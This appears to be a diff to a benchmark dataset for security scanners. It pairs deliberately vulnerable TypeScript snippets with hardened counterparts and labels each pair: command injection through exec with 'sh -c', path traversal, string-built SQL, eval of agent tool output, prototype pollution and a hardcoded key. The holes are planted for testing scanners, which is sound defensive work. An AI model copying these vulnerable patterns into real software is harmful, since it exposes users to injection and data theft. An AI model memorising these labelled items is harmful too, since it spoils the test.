+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "Safe Command Execution with execFile Array Defense #5",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "owasp/cmd/safe_5.ts",
+    "code": "\nimport { execFile } from 'child_process';\nexport function runCmdSafe_5(req: any) {\n  const target = req.query.target;\n  execFile('/usr/bin/nslookup', [String(target)], (err, stdout) => { console.log(stdout); });\n}\n",
+    "deceptiveTrap": "execFile argument array isolates shell execution boundary."
   },
   {
-    id: 'BIZ-IDOR-002-GOOD',
-    suite: 'BUSINESS_LOGIC_IDOR',
-    category: 'BUSINESS_LOGIC',
-    cwe: 'CWE-639',
-    name: 'Hardened Wallet Withdrawal with Session Ownership Binding (Trap for Naive Tools)',
-    isVulnerable: false,
-    language: 'ts',
-    filename: 'bizlogic/safe_wallet_withdraw.ts',
-    code: `
-export async function handleWithdrawSafe(req: any, res: any, db: any) {
-  const targetUserId = req.params.userId;
-  const amount = Number(req.body.amount);
-
-  // SAFE: Strict identity enforcement binds authenticated session token to resource owner
-  if (req.user.id !== targetUserId) {
-    return res.status(403).json({ error: "Forbidden: Cannot access other users' wallets" });
-  }
-
-  // Scoped database update with ownership clause
-  const wallet = await db.wallets.findOne({ userId: targetUserId, ownerId: req.user.id });
-  await db.wallets.updateBalance(targetUserId, -amount);
-  return res.json({ success: true, withdrawn: amount });
-}
-`,
-    deceptiveTrap: 'Naive scanners flag parameter userId in URL without recognizing the req.user.id !== targetUserId authorization barrier.'
+    "id": "OWASP-PATH-001-BAD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "PATH_TRAVERSAL",
+    "cwe": "CWE-22",
+    "name": "Arbitrary File Read via Path Traversal Variant #1",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "owasp/path/vulnerable_1.ts",
+    "code": "\nimport fs from 'fs';\nimport path from 'path';\nexport function loadDoc_1(req: any) {\n  const doc = req.query.filename;\n  return fs.readFileSync(path.join('/var/data', doc), 'utf-8');\n}\n",
+    "deceptiveTrap": "path.join with unsanitized user query parameter allows ../ traversal."
   },
   {
-    id: 'BIZ-PRICE-003-BAD',
-    suite: 'BUSINESS_LOGIC_IDOR',
-    category: 'BUSINESS_LOGIC',
-    cwe: 'CWE-472',
-    name: 'Client-Side Arbitrary Price Manipulation in Checkout',
-    isVulnerable: true,
-    language: 'ts',
-    filename: 'bizlogic/price_tamper_bad.ts',
-    code: `
-export async function processPayment(req: any, res: any, paymentGateway: any) {
-  const { productId, quantity } = req.body;
-  // Vulnerable: trusts client-submitted price directly from request body!
-  const price = req.body.price;
-  const total = price * quantity;
-
-  // Attacker sends price: 0.01 to purchase a $5,000 item
-  const charge = await paymentGateway.chargeCustomer(total);
-  return res.json({ status: 'paid', chargeId: charge.id });
-}
-`,
-    deceptiveTrap: 'Client-side parameter tampering allowing buyers to dictate product prices.'
+    "id": "OWASP-PATH-001-GOOD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "PATH_TRAVERSAL",
+    "cwe": "CWE-22",
+    "name": "Strict Path Boundary Verification Defense #1",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "owasp/path/safe_1.ts",
+    "code": "\nimport fs from 'fs';\nimport path from 'path';\nexport function loadDocSafe_1(req: any) {\n  const base = '/var/data';\n  const clean = path.basename(String(req.query.filename || 'default.txt'));\n  return fs.readFileSync(path.join(base, clean), 'utf-8');\n}\n",
+    "deceptiveTrap": "path.basename completely strips traversal directory components."
   },
   {
-    id: 'BIZ-PRICE-004-GOOD',
-    suite: 'BUSINESS_LOGIC_IDOR',
-    category: 'BUSINESS_LOGIC',
-    cwe: 'CWE-472',
-    name: 'Canonical Catalog Price Resolution from Database (Trap for Naive Tools)',
-    isVulnerable: false,
-    language: 'ts',
-    filename: 'bizlogic/safe_checkout.ts',
-    code: `
-export async function processPaymentSafe(req: any, res: any, db: any, paymentGateway: any) {
-  const { productId, quantity } = req.body;
-
-  // SAFE: Price is retrieved strictly from authoritative database catalog, ignoring client body
-  const product = await db.products.findById(productId);
-  if (!product) return res.status(404).json({ error: "Product not found" });
-
-  const canonicalPrice = product.price;
-  const total = canonicalPrice * Number(quantity);
-
-  const charge = await paymentGateway.chargeCustomer(total);
-  return res.json({ status: 'paid', chargeId: charge.id });
-}
-`,
-    deceptiveTrap: 'Contains checkout/payment keywords but ignores client price in favor of database catalog lookup.'
+    "id": "OWASP-PATH-002-BAD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "PATH_TRAVERSAL",
+    "cwe": "CWE-22",
+    "name": "Arbitrary File Read via Path Traversal Variant #2",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "owasp/path/vulnerable_2.ts",
+    "code": "\nimport fs from 'fs';\nimport path from 'path';\nexport function loadDoc_2(req: any) {\n  const doc = req.query.filename;\n  return fs.readFileSync(path.join('/var/data', doc), 'utf-8');\n}\n",
+    "deceptiveTrap": "path.join with unsanitized user query parameter allows ../ traversal."
   },
   {
-    id: 'BIZ-NUMERIC-005-BAD',
-    suite: 'BUSINESS_LOGIC_IDOR',
-    category: 'BUSINESS_LOGIC',
-    cwe: 'CWE-839',
-    name: 'Missing Positive Bounds Check Allowing Negative Transfer (Balance Inflation)',
-    isVulnerable: true,
-    language: 'ts',
-    filename: 'bizlogic/negative_amount_bad.ts',
-    code: `
-export async function transferFunds(sender: any, recipient: any, amount: number) {
-  // Vulnerable: No positive amount check!
-  // If amount is negative (e.g. -5000), sender.balance -= (-5000) => balance increases!
-  sender.balance -= amount;
-  recipient.balance += amount;
-  return { success: true };
-}
-`,
-    deceptiveTrap: 'Arithmetic sign manipulation where negative withdrawal acts as balance deposit.'
+    "id": "OWASP-PATH-002-GOOD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "PATH_TRAVERSAL",
+    "cwe": "CWE-22",
+    "name": "Strict Path Boundary Verification Defense #2",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "owasp/path/safe_2.ts",
+    "code": "\nimport fs from 'fs';\nimport path from 'path';\nexport function loadDocSafe_2(req: any) {\n  const base = '/var/data';\n  const clean = path.basename(String(req.query.filename || 'default.txt'));\n  return fs.readFileSync(path.join(base, clean), 'utf-8');\n}\n",
+    "deceptiveTrap": "path.basename completely strips traversal directory components."
   },
   {
-    id: 'BIZ-NUMERIC-006-GOOD',
-    suite: 'BUSINESS_LOGIC_IDOR',
-    category: 'BUSINESS_LOGIC',
-    cwe: 'CWE-839',
-    name: 'Validated Positive Amount Bounds Check (Trap for Naive Tools)',
-    isVulnerable: false,
-    language: 'ts',
-    filename: 'bizlogic/safe_numeric_transfer.ts',
-    code: `
-export async function transferFundsSafe(sender: any, recipient: any, amount: number) {
-  // SAFE: Strict numeric guard disallowing zero or negative values
-  if (typeof amount !== 'number' || amount <= 0 || !Number.isFinite(amount)) {
-    throw new Error("Invalid transfer amount: Must be strictly greater than 0");
-  }
-
-  if (sender.balance < amount) {
-    throw new Error("Insufficient funds");
-  }
-
-  sender.balance -= amount;
-  recipient.balance += amount;
-  return { success: true };
-}
-`,
-    deceptiveTrap: 'Arithmetic operations with comprehensive input positivity verification.'
-  },
-
-  // =========================================================================
-  // SUITE 7: AUTONOMOUS ZERO-DAY LIVE INGESTION BENCHMARK
-  // =========================================================================
-  {
-    id: '0DAY-GHSA-001-BAD',
-    suite: 'ZERO_DAY_LIVE_INGEST',
-    category: 'INJECTION',
-    cwe: 'CWE-94',
-    name: 'GitHub Advisory GHSA-2026-X99: Zero-Day Dangerous Deserializer Hook',
-    isVulnerable: true,
-    language: 'ts',
-    filename: 'zeroday/dangerous_hook_bad.ts',
-    code: `
-export function applyCustomHook(req: any, parser: any) {
-  const dynamicHookPayload = req.body.hookPayload;
-  // Newly disclosed 0-day sink: customPayloadHookExec allowing arbitrary sandbox escape
-  return parser.customPayloadHookExec(dynamicHookPayload);
-}
-`,
-    deceptiveTrap: 'Unseen novel 0-day API published today on GitHub Advisory feed.'
+    "id": "JULIET-CWE-78-001-BAD",
+    "suite": "NIST_JULIET",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "Juliet CWE-78: OS Command Injection Flow Pattern #1",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "juliet/cwe-78/vulnerable_1.ts",
+    "code": "\nexport function julietSink_0_1(req: any, db: any) {\n  const userInput = req.query.val;\n  const cmd = userInput;\n  const filename = userInput;\n  const expr = userInput;\n  const data = userInput;\n  const id = userInput;\n  const dst: any = {};\n  const src: any = { [userInput]: 'polluted' };\n  exec(`sh -c \"${cmd}\"`);\n}\n",
+    "deceptiveTrap": "Juliet test vector for CWE-78: OS Command Injection."
   },
   {
-    id: '0DAY-GHSA-002-GOOD',
-    suite: 'ZERO_DAY_LIVE_INGEST',
-    category: 'INJECTION',
-    cwe: 'CWE-94',
-    name: 'Safe Isolated JSON Parser Without Dangerous Dynamic Hook (Trap)',
-    isVulnerable: false,
-    language: 'ts',
-    filename: 'zeroday/safe_hook_handler.ts',
-    code: `
-export function applySafeParser(req: any, parser: any) {
-  const payload = req.body.data;
-  // SAFE: Standard strict schema parsing without dangerous customPayloadHookExec
-  return JSON.parse(String(payload));
-}
-`,
-    deceptiveTrap: 'Similar dataflow but avoids the newly disclosed 0-day sink function.'
-  },
-
-  // =========================================================================
-  // SUITE 8: SOFTWARE COMPOSITION ANALYSIS (SCA) & DEPENDENCY VULNERABILITIES
-  // =========================================================================
-  {
-    id: 'SCA-NPM-001-BAD',
-    suite: 'DEPENDENCY_SCA',
-    category: 'DEPENDENCY',
-    cwe: 'CWE-1321',
-    name: 'Node.js Manifest Containing Outdated Vulnerable Dependencies (lodash & axios)',
-    isVulnerable: true,
-    language: 'json',
-    filename: 'sca_npm_vuln/package.json',
-    code: `{
-  "name": "vulnerable-app",
-  "version": "1.0.0",
-  "dependencies": {
-    "lodash": "4.17.15",
-    "axios": "0.21.1"
-  }
-}`,
-    deceptiveTrap: 'Real-world vulnerable npm manifest with Prototype Pollution and SSRF CVEs.'
+    "id": "JULIET-CWE-78-001-GOOD",
+    "suite": "NIST_JULIET",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "Juliet CWE-78: OS Command Injection Hardened Defense #1",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "juliet/cwe-78/safe_1.ts",
+    "code": "\nexport function julietSafe_0_1(req: any, db: any) {\n  const userInput = req.query.val;\n  const id = 'safe-id';\n  const expr = '100';\n  const data = 'safe-payload';\n  const dst: any = {};\n  const src: any = {};\n  execFile(\"sh\", [\"-c\", \"ls\"]);\n}\n",
+    "deceptiveTrap": "Safe counter-pattern disproving false positive in CWE-78: OS Command Injection."
   },
   {
-    id: 'SCA-NPM-002-GOOD',
-    suite: 'DEPENDENCY_SCA',
-    category: 'DEPENDENCY',
-    cwe: 'CWE-1321',
-    name: 'Node.js Manifest With Fully Patched Dependencies (Trap)',
-    isVulnerable: false,
-    language: 'json',
-    filename: 'sca_npm_safe/package.json',
-    code: `{
-  "name": "safe-app",
-  "version": "1.0.0",
-  "dependencies": {
-    "lodash": "^4.17.21",
-    "axios": "^1.7.4"
-  }
-}`,
-    deceptiveTrap: 'Contains the same package names but versions are securely patched to safe baselines.'
+    "id": "JULIET-CWE-78-002-BAD",
+    "suite": "NIST_JULIET",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "Juliet CWE-78: OS Command Injection Flow Pattern #2",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "juliet/cwe-78/vulnerable_2.ts",
+    "code": "\nexport function julietSink_0_2(req: any, db: any) {\n  const userInput = req.query.val;\n  const cmd = userInput;\n  const filename = userInput;\n  const expr = userInput;\n  const data = userInput;\n  const id = userInput;\n  const dst: any = {};\n  const src: any = { [userInput]: 'polluted' };\n  exec(`sh -c \"${cmd}\"`);\n}\n",
+    "deceptiveTrap": "Juliet test vector for CWE-78: OS Command Injection."
   },
   {
-    id: 'SCA-PY-001-BAD',
-    suite: 'DEPENDENCY_SCA',
-    category: 'DEPENDENCY',
-    cwe: 'CWE-200',
-    name: 'Python Requirements Manifest Containing Vulnerable requests & urllib3 (CVE-2023-32681)',
-    isVulnerable: true,
-    language: 'txt',
-    filename: 'sca_py_vuln/requirements.txt',
-    code: `requests==2.20.0
-urllib3==1.25.8
-flask==2.0.1
-`,
-    deceptiveTrap: 'Common real-world Python requirements file with token leakage CVEs.'
+    "id": "JULIET-CWE-78-002-GOOD",
+    "suite": "NIST_JULIET",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "Juliet CWE-78: OS Command Injection Hardened Defense #2",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "juliet/cwe-78/safe_2.ts",
+    "code": "\nexport function julietSafe_0_2(req: any, db: any) {\n  const userInput = req.query.val;\n  const id = 'safe-id';\n  const expr = '100';\n  const data = 'safe-payload';\n  const dst: any = {};\n  const src: any = {};\n  execFile(\"sh\", [\"-c\", \"ls\"]);\n}\n",
+    "deceptiveTrap": "Safe counter-pattern disproving false positive in CWE-78: OS Command Injection."
   },
   {
-    id: 'SCA-PY-002-GOOD',
-    suite: 'DEPENDENCY_SCA',
-    category: 'DEPENDENCY',
-    cwe: 'CWE-200',
-    name: 'Python Requirements Manifest With Patched Upgrades (Trap)',
-    isVulnerable: false,
-    language: 'txt',
-    filename: 'sca_py_safe/requirements.txt',
-    code: `requests>=2.31.0
-urllib3>=2.0.7
-flask>=2.2.5
-`,
-    deceptiveTrap: 'Same dependency list with modern safe patched constraints.'
+    "id": "JULIET-CWE-78-003-BAD",
+    "suite": "NIST_JULIET",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "Juliet CWE-78: OS Command Injection Flow Pattern #3",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "juliet/cwe-78/vulnerable_3.ts",
+    "code": "\nexport function julietSink_0_3(req: any, db: any) {\n  const userInput = req.query.val;\n  const cmd = userInput;\n  const filename = userInput;\n  const expr = userInput;\n  const data = userInput;\n  const id = userInput;\n  const dst: any = {};\n  const src: any = { [userInput]: 'polluted' };\n  exec(`sh -c \"${cmd}\"`);\n}\n",
+    "deceptiveTrap": "Juliet test vector for CWE-78: OS Command Injection."
+  },
+  {
+    "id": "JULIET-CWE-78-003-GOOD",
+    "suite": "NIST_JULIET",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "Juliet CWE-78: OS Command Injection Hardened Defense #3",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "juliet/cwe-78/safe_3.ts",
+    "code": "\nexport function julietSafe_0_3(req: any, db: any) {\n  const userInput = req.query.val;\n  const id = 'safe-id';\n  const expr = '100';\n  const data = 'safe-payload';\n  const dst: any = {};\n  const src: any = {};\n  execFile(\"sh\", [\"-c\", \"ls\"]);\n}\n",
+    "deceptiveTrap": "Safe counter-pattern disproving false positive in CWE-78: OS Command Injection."
+  },
+  {
+    "id": "JULIET-CWE-78-004-BAD",
+    "suite": "NIST_JULIET",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "Juliet CWE-78: OS Command Injection Flow Pattern #4",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "juliet/cwe-78/vulnerable_4.ts",
+    "code": "\nexport function julietSink_0_4(req: any, db: any) {\n  const userInput = req.query.val;\n  const cmd = userInput;\n  const filename = userInput;\n  const expr = userInput;\n  const data = userInput;\n  const id = userInput;\n  const dst: any = {};\n  const src: any = { [userInput]: 'polluted' };\n  exec(`sh -c \"${cmd}\"`);\n}\n",
+    "deceptiveTrap": "Juliet test vector for CWE-78: OS Command Injection."
+  },
+  {
+    "id": "JULIET-CWE-78-004-GOOD",
+    "suite": "NIST_JULIET",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "Juliet CWE-78: OS Command Injection Hardened Defense #4",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "juliet/cwe-78/safe_4.ts",
+    "code": "\nexport function julietSafe_0_4(req: any, db: any) {\n  const userInput = req.query.val;\n  const id = 'safe-id';\n  const expr = '100';\n  const data = 'safe-payload';\n  const dst: any = {};\n  const src: any = {};\n  execFile(\"sh\", [\"-c\", \"ls\"]);\n}\n",
+    "deceptiveTrap": "Safe counter-pattern disproving false positive in CWE-78: OS Command Injection."
+  },
+  {
+    "id": "JULIET-CWE-78-005-BAD",
+    "suite": "NIST_JULIET",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "Juliet CWE-78: OS Command Injection Flow Pattern #5",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "juliet/cwe-78/vulnerable_5.ts",
+    "code": "\nexport function julietSink_0_5(req: any, db: any) {\n  const userInput = req.query.val;\n  const cmd = userInput;\n  const filename = userInput;\n  const expr = userInput;\n  const data = userInput;\n  const id = userInput;\n  const dst: any = {};\n  const src: any = { [userInput]: 'polluted' };\n  exec(`sh -c \"${cmd}\"`);\n}\n",
+    "deceptiveTrap": "Juliet test vector for CWE-78: OS Command Injection."
+  },
+  {
+    "id": "JULIET-CWE-78-005-GOOD",
+    "suite": "NIST_JULIET",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "Juliet CWE-78: OS Command Injection Hardened Defense #5",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "juliet/cwe-78/safe_5.ts",
+    "code": "\nexport function julietSafe_0_5(req: any, db: any) {\n  const userInput = req.query.val;\n  const id = 'safe-id';\n  const expr = '100';\n  const data = 'safe-payload';\n  const dst: any = {};\n  const src: any = {};\n  execFile(\"sh\", [\"-c\", \"ls\"]);\n}\n",
+    "deceptiveTrap": "Safe counter-pattern disproving false positive in CWE-78: OS Command Injection."
+  },
+  {
+    "id": "JULIET-CWE-89-006-BAD",
+    "suite": "NIST_JULIET",
+    "category": "SQL_INJECTION",
+    "cwe": "CWE-89",
+    "name": "Juliet CWE-89: SQL Injection Flow Pattern #1",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "juliet/cwe-89/vulnerable_1.ts",
+    "code": "\nexport function julietSink_1_1(req: any, db: any) {\n  const userInput = req.query.val;\n  const cmd = userInput;\n  const filename = userInput;\n  const expr = userInput;\n  const data = userInput;\n  const id = userInput;\n  const dst: any = {};\n  const src: any = { [userInput]: 'polluted' };\n  db.query(\"SELECT * FROM items WHERE id = \" + id);\n}\n",
+    "deceptiveTrap": "Juliet test vector for CWE-89: SQL Injection."
+  },
+  {
+    "id": "JULIET-CWE-89-006-GOOD",
+    "suite": "NIST_JULIET",
+    "category": "SQL_INJECTION",
+    "cwe": "CWE-89",
+    "name": "Juliet CWE-89: SQL Injection Hardened Defense #1",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "juliet/cwe-89/safe_1.ts",
+    "code": "\nexport function julietSafe_1_1(req: any, db: any) {\n  const userInput = req.query.val;\n  const id = 'safe-id';\n  const expr = '100';\n  const data = 'safe-payload';\n  const dst: any = {};\n  const src: any = {};\n  db.query(\"SELECT * FROM items WHERE id = ?\", [id]);\n}\n",
+    "deceptiveTrap": "Safe counter-pattern disproving false positive in CWE-89: SQL Injection."
+  },
+  {
+    "id": "JULIET-CWE-89-007-BAD",
+    "suite": "NIST_JULIET",
+    "category": "SQL_INJECTION",
+    "cwe": "CWE-89",
+    "name": "Juliet CWE-89: SQL Injection Flow Pattern #2",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "juliet/cwe-89/vulnerable_2.ts",
+    "code": "\nexport function julietSink_1_2(req: any, db: any) {\n  const userInput = req.query.val;\n  const cmd = userInput;\n  const filename = userInput;\n  const expr = userInput;\n  const data = userInput;\n  const id = userInput;\n  const dst: any = {};\n  const src: any = { [userInput]: 'polluted' };\n  db.query(\"SELECT * FROM items WHERE id = \" + id);\n}\n",
+    "deceptiveTrap": "Juliet test vector for CWE-89: SQL Injection."
+  },
+  {
+    "id": "JULIET-CWE-89-007-GOOD",
+    "suite": "NIST_JULIET",
+    "category": "SQL_INJECTION",
+    "cwe": "CWE-89",
+    "name": "Juliet CWE-89: SQL Injection Hardened Defense #2",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "juliet/cwe-89/safe_2.ts",
+    "code": "\nexport function julietSafe_1_2(req: any, db: any) {\n  const userInput = req.query.val;\n  const id = 'safe-id';\n  const expr = '100';\n  const data = 'safe-payload';\n  const dst: any = {};\n  const src: any = {};\n  db.query(\"SELECT * FROM items WHERE id = ?\", [id]);\n}\n",
+    "deceptiveTrap": "Safe counter-pattern disproving false positive in CWE-89: SQL Injection."
+  },
+  {
+    "id": "JULIET-CWE-89-008-BAD",
+    "suite": "NIST_JULIET",
+    "category": "SQL_INJECTION",
+    "cwe": "CWE-89",
+    "name": "Juliet CWE-89: SQL Injection Flow Pattern #3",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "juliet/cwe-89/vulnerable_3.ts",
+    "code": "\nexport function julietSink_1_3(req: any, db: any) {\n  const userInput = req.query.val;\n  const cmd = userInput;\n  const filename = userInput;\n  const expr = userInput;\n  const data = userInput;\n  const id = userInput;\n  const dst: any = {};\n  const src: any = { [userInput]: 'polluted' };\n  db.query(\"SELECT * FROM items WHERE id = \" + id);\n}\n",
+    "deceptiveTrap": "Juliet test vector for CWE-89: SQL Injection."
+  },
+  {
+    "id": "JULIET-CWE-89-008-GOOD",
+    "suite": "NIST_JULIET",
+    "category": "SQL_INJECTION",
+    "cwe": "CWE-89",
+    "name": "Juliet CWE-89: SQL Injection Hardened Defense #3",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "juliet/cwe-89/safe_3.ts",
+    "code": "\nexport function julietSafe_1_3(req: any, db: any) {\n  const userInput = req.query.val;\n  const id = 'safe-id';\n  const expr = '100';\n  const data = 'safe-payload';\n  const dst: any = {};\n  const src: any = {};\n  db.query(\"SELECT * FROM items WHERE id = ?\", [id]);\n}\n",
+    "deceptiveTrap": "Safe counter-pattern disproving false positive in CWE-89: SQL Injection."
+  },
+  {
+    "id": "CYBERSEC-PROMPT-001-BAD",
+    "suite": "CYBERSEC_EVAL",
+    "category": "AI_AGENT_SECURITY",
+    "cwe": "CWE-94",
+    "name": "Unsanitized Prompt Concatenation Injection #1",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "cybersec/prompt/vulnerable_1.ts",
+    "code": "\nexport function buildPrompt_1(userInput: string) {\n  // Vulnerable prompt concatenation allows jailbreak\n  return eval(\"const p = 'Query: \" + userInput + \"'; p;\");\n}\n",
+    "deceptiveTrap": "Direct concatenation and dynamic evaluation in LLM prompt pipeline."
+  },
+  {
+    "id": "CYBERSEC-PROMPT-001-GOOD",
+    "suite": "CYBERSEC_EVAL",
+    "category": "AI_AGENT_SECURITY",
+    "cwe": "CWE-94",
+    "name": "Delimited Structured System/User Role Separation #1",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "cybersec/prompt/safe_1.ts",
+    "code": "\nexport function buildPromptSafe_1(userInput: string) {\n  return [\n    { role: 'system', content: 'You are a strictly bounded assistant.' },\n    { role: 'user', content: String(userInput) }\n  ];\n}\n",
+    "deceptiveTrap": "Delimited structured role messages."
+  },
+  {
+    "id": "CYBERSEC-TOOL-001-BAD",
+    "suite": "CYBERSEC_EVAL",
+    "category": "CODE_INJECTION",
+    "cwe": "CWE-95",
+    "name": "Untrusted Tool Code Execution Sink #1",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "cybersec/tool/vulnerable_1.ts",
+    "code": "\nexport function runTool_1(toolResult: string) {\n  return eval(toolResult);\n}\n",
+    "deceptiveTrap": "Evaluating agent tool output directly."
+  },
+  {
+    "id": "CYBERSEC-TOOL-001-GOOD",
+    "suite": "CYBERSEC_EVAL",
+    "category": "CODE_INJECTION",
+    "cwe": "CWE-95",
+    "name": "Schema Validated Tool Parser #1",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "cybersec/tool/safe_1.ts",
+    "code": "\nexport function runToolSafe_1(toolResult: string) {\n  return JSON.parse(toolResult);\n}\n",
+    "deceptiveTrap": "Structured JSON validation."
+  },
+  {
+    "id": "CYBERSEC-STATE-001-BAD",
+    "suite": "CYBERSEC_EVAL",
+    "category": "PROTOTYPE_POLLUTION",
+    "cwe": "CWE-1321",
+    "name": "Agent Memory State Prototype Pollution #1",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "cybersec/state/vulnerable_1.ts",
+    "code": "\nexport function mergeAgentState_1(state: any, update: any) {\n  for (const key of Object.keys(update)) {\n    state[key] = update[key];\n  }\n}\n",
+    "deceptiveTrap": "Agent memory state merger without __proto__ filtering."
+  },
+  {
+    "id": "CYBERSEC-STATE-001-GOOD",
+    "suite": "CYBERSEC_EVAL",
+    "category": "PROTOTYPE_POLLUTION",
+    "cwe": "CWE-1321",
+    "name": "Hardened Memory State Guard #1",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "cybersec/state/safe_1.ts",
+    "code": "\nexport function mergeAgentStateSafe_1(state: any, update: any) {\n  for (const key of Object.keys(update)) {\n    if (key === '__proto__' || key === 'constructor') continue;\n    state[key] = update[key];\n  }\n}\n",
+    "deceptiveTrap": "Filtered prototype keys."
+  },
+  {
+    "id": "CYBERSEC-KEY-001-BAD",
+    "suite": "CYBERSEC_EVAL",
+    "category": "HARDCODED_SECRET",
+    "cwe": "CWE-798",
+    "name": "Hardcoded LLM Gateway Master Key #1",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "cybersec/key/vulnerable_1.ts",
+    "code": "\nexport const openai_api_key = \"sk_live_llm_gateway_token_1_secret_123456789\";\n",
+    "deceptiveTrap": "Exposed master gateway token in LLM agent orchestration."
+  },
+  {
+    "id": "CYBERSEC-KEY-001-GOOD",
+    "suite": "CYBERSEC_EVAL",
+    "category": "HARDCODED_SECRET",
+    "cwe": "CWE-798",
+    "name": "Env Ingested LLM Key #1",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "cybersec/key/safe_1.ts",
+    "code": "\nexport const openaiApiKey = process.env.OPENAI_API_KEY || \"\";\n",
+    "deceptiveTrap": "Environment variable secret injection."
+  },
+  {
+    "id": "CYBERSEC-SHELL-001-BAD",
+    "suite": "CYBERSEC_EVAL",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "Agent Shell Execution Sink #1",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "cybersec/shell/vulnerable_1.ts",
+    "code": "\nimport { exec } from 'child_process';\nexport function executeAgentShell_1(command: string) {\n  exec(`bash -c \"${command}\"`);\n}\n",
+    "deceptiveTrap": "Unrestricted bash execution from agent tool."
+  },
+  {
+    "id": "CYBERSEC-SHELL-001-GOOD",
+    "suite": "CYBERSEC_EVAL",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "Sandboxed Fixed Command Executor #1",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "cybersec/shell/safe_1.ts",
+    "code": "\nimport { execFile } from 'child_process';\nexport function executeAgentShellSafe_1(arg: string) {\n  execFile('/bin/echo', [String(arg)]);\n}\n",
+    "deceptiveTrap": "Safe isolated command execution."
+  },
+  {
+    "id": "CYBERSEC-PROMPT-002-BAD",
+    "suite": "CYBERSEC_EVAL",
+    "category": "AI_AGENT_SECURITY",
+    "cwe": "CWE-94",
+    "name": "Unsanitized Prompt Concatenation Injection #2",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "cybersec/prompt/vulnerable_2.ts",
+    "code": "\nexport function buildPrompt_2(userInput: string) {\n  // Vulnerable prompt concatenation allows jailbreak\n  return eval(\"const p = 'Query: \" + userInput + \"'; p;\");\n}\n",
+    "deceptiveTrap": "Direct concatenation and dynamic evaluation in LLM prompt pipeline."
+  },
+  {
+    "id": "CYBERSEC-PROMPT-002-GOOD",
+    "suite": "CYBERSEC_EVAL",
+    "category": "AI_AGENT_SECURITY",
+    "cwe": "CWE-94",
+    "name": "Delimited Structured System/User Role Separation #2",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "cybersec/prompt/safe_2.ts",
+    "code": "\nexport function buildPromptSafe_2(userInput: string) {\n  return [\n    { role: 'system', content: 'You are a strictly bounded assistant.' },\n    { role: 'user', content: String(userInput) }\n  ];\n}\n",
+    "deceptiveTrap": "Delimited structured role messages."
+  },
+  {
+    "id": "CYBERSEC-TOOL-002-BAD",
+    "suite": "CYBERSEC_EVAL",
+    "category": "CODE_INJECTION",
+    "cwe": "CWE-95",
+    "name": "Untrusted Tool Code Execution Sink #2",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "cybersec/tool/vulnerable_2.ts",
+    "code": "\nexport function runTool_2(toolResult: string) {\n  return eval(toolResult);\n}\n",
+    "deceptiveTrap": "Evaluating agent tool output directly."
+  },
+  {
+    "id": "CYBERSEC-TOOL-002-GOOD",
+    "suite": "CYBERSEC_EVAL",
+    "category": "CODE_INJECTION",
+    "cwe": "CWE-95",
+    "name": "Schema Validated Tool Parser #2",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "cybersec/tool/safe_2.ts",
+    "code": "\nexport function runToolSafe_2(toolResult: string) {\n  return JSON.parse(toolResult);\n}\n",
+    "deceptiveTrap": "Structured JSON validation."
+  },
+  {
+    "id": "CYBERSEC-STATE-002-BAD",
+    "suite": "CYBERSEC_EVAL",
+    "category": "PROTOTYPE_POLLUTION",
+    "cwe": "CWE-1321",
+    "name": "Agent Memory State Prototype Pollution #2",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "cybersec/state/vulnerable_2.ts",
+    "code": "\nexport function mergeAgentState_2(state: any, update: any) {\n  for (const key of Object.keys(update)) {\n    state[key] = update[key];\n  }\n}\n",
